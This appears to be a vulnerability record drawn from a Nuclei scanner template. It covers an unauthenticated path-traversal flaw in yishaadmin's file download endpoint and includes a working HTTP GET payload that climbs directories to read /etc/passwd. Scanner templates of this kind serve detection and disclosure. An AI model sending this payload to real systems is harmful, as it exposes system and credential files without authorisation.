# Nuclei Template: yishaadmin - Local File Inclusion
**Template ID:** yishaadmin-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`yishaadmin-lfi.yaml`)

## Vulnerability Information & PoC

## Description
yishaadmin is vulnerable to local file inclusion via the "/admin/File/DownloadFile" endpoint and allows files to be downloaded, read or deleted without any authentication.

## Steps to reproduce / Exploit Payload
```http
GET /admin/File/DownloadFile?filePath=wwwroot/..././/..././/..././/..././/..././/..././/..././/..././etc/passwd&delete=0 HTTP/1.1
Host: {{Hostname}}
```

## References
- https://huntr.dev/bounties/2acdd87a-12bd-4ce4-994b-0081eb908128/
- https://github.com/liukuo362573/YiShaAdmin/blob/master/YiSha.Util/YiSha.Util/FileHelper.cs#L181-L186
